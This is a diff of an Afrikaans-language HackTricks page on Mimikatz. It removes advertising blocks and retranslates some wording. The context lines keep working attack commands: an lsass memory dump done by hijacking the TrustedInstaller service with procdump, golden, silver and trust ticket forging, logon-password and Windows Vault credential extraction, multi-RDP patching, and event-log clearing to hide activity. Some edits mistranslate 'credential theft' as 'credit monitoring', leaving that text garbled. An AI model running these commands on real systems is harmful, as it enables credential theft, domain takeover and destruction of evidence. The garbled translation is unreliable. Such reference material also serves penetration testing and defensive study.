@@ -2,17 +2,12 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry gesertifiseer:
-
-{% embed url="https://academy.8ksec.io/" %}
-
-**Hierdie bladsy is gebaseer op een van [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Kyk die oorspronklike vir verdere inligting!
+**Hierdie bladsy is gebaseer op een van [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Kyk na die oorspronklike vir verdere inligting!
 
 ## LM en Duidelike Teks in geheue
 
-Vanaf Windows 8.1 en Windows Server 2012 R2 is beduidende maatreëls geïmplementeer om teen diefstal van geloofsbriewe te beskerm:
+Vanaf Windows 8.1 en Windows Server 2012 R2 is beduidende maatreëls geïmplementeer om teen kredietbewaking te beskerm:
 
 - **LM hashes en plain-text wagwoorde** word nie meer in geheue gestoor om sekuriteit te verbeter nie. 'n Spesifieke registrasie instelling, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ moet geconfigureer word met 'n DWORD waarde van `0` om Digest Authentication te deaktiveer, wat verseker dat "duidelike teks" wagwoorde nie in LSASS gegee word nie.
 
@@ -24,7 +19,7 @@ Ten spyte van hierdie beskermings, kan gereedskap soos Mimikatz LSA Beskerming o
 
 ### Teenwerking van SeDebugPrivilege Verwydering
 
-Administrateurs het tipies SeDebugPrivilege, wat hulle in staat stel om programme te debugeer. Hierdie voorreg kan beperk word om ongeoorloofde geheue dumps te voorkom, 'n algemene tegniek wat deur aanvallers gebruik word om geloofsbriewe uit geheue te onttrek. Maar, selfs met hierdie voorreg verwyder, kan die TrustedInstaller rekening steeds geheue dumps uitvoer deur 'n aangepaste dienskonfigurasie:
+Administrateurs het tipies SeDebugPrivilege, wat hulle in staat stel om programme te debugeer. Hierdie voorreg kan beperk word om ongeoorloofde geheue dumps te voorkom, 'n algemene tegniek wat deur aanvallers gebruik word om kredietbewaking uit geheue te onttrek. Maar, selfs met hierdie voorreg verwyder, kan die TrustedInstaller rekening steeds geheue dumps uitvoer deur 'n aangepaste dienskonfigurasie:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
@@ -42,7 +37,7 @@ Event log manipulasie in Mimikatz behels twee primêre aksies: die skoonmaak van
 #### Skoonmaak van Gebeurtenislogs
 
 - **Opdrag**: Hierdie aksie is daarop gemik om die gebeurtenislogs te verwyder, wat dit moeiliker maak om kwaadwillige aktiwiteite te volg.
-- Mimikatz bied nie 'n direkte opdrag in sy standaard dokumentasie vir die skoonmaak van gebeurtenislogs direk via sy opdraglyn nie. Dit is egter algemeen dat gebeurtenislog manipulasie die gebruik van stelsels gereedskap of skripte buite Mimikatz behels om spesifieke logs skoon te maak (bv. met PowerShell of Windows Event Viewer).
+- Mimikatz bied nie 'n direkte opdrag in sy standaard dokumentasie vir die skoonmaak van gebeurtenislogs direk via sy opdraglyn nie. Dit behels egter tipies die gebruik van stelsels gereedskap of skripte buite Mimikatz om spesifieke logs skoon te maak (bv. deur PowerShell of Windows Event Viewer te gebruik).
 
 #### Eksperimentele Kenmerk: Patching van die Event-diens
 
@@ -65,7 +60,7 @@ Event log manipulasie in Mimikatz behels twee primêre aksies: die skoonmaak van
 - `/sid`: Die domein se Veiligheidsidentifiseerder (SID).
 - `/user`: Die gebruikersnaam om te impersonate.
 - `/krbtgt`: Die NTLM-hash van die domein se KDC-diensrekening.
-- `/ptt`: Spesifiek die teken direk in geheue inspuit.
+- `/ptt`: Spesifiek die teken direk in geheue in te spuit.
 - `/ticket`: Stoor die teken vir later gebruik.
 
 Voorbeeld:
@@ -76,7 +71,7 @@ mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-1234567
 
 Silver Tickets gee toegang tot spesifieke dienste. Sleutelopdrag en parameters:
 
-- Opdrag: Soortgelyk aan Golden Ticket maar teiken spesifieke dienste.
+- Opdrag: Soortgelyk aan Golden Ticket, maar teiken spesifieke dienste.
 - Parameters:
 - `/service`: Die diens om te teiken (bv., cifs, http).
 - Ander parameters soortgelyk aan Golden Ticket.
@@ -91,7 +86,7 @@ Vertroue Teken word gebruik om toegang tot hulpbronne oor domeine te verkry deur
 
 - Opdrag: Soortgelyk aan Goue Teken, maar vir vertrouensverhoudings.
 - Parameters:
-- `/target`: Die teikendomein se FQDN.
+- `/target`: Die teiken-domein se FQDN.
 - `/rc4`: Die NTLM-hash vir die vertrouensrekening.
 
 Voorbeeld:
@@ -170,9 +165,9 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **PRIVILEGE::Debug**: Verkry debug regte.
 - `mimikatz "privilege::debug" exit`
 
-### Krediet Dumping
+### Kredietdumping
 
-- **SEKURLSA::LogonPasswords**: Toon krediete vir ingelogde gebruikers.
+- **SEKURLSA::LogonPasswords**: Wys krediete vir ingelogde gebruikers.
 
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
@@ -191,7 +186,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Terminal Dienste
 
-- **TS::MultiRDP**: Laat verskeie RDP sessies toe.
+- **TS::MultiRDP**: Laat meerdere RDP sessies toe.
 
 - `mimikatz "ts::multirdp" exit`
 
@@ -203,10 +198,5 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Trek wagwoorde uit Windows Kluis.
 - `mimikatz "vault::cred /patch" exit`
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry sertifisering:
-
-{% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
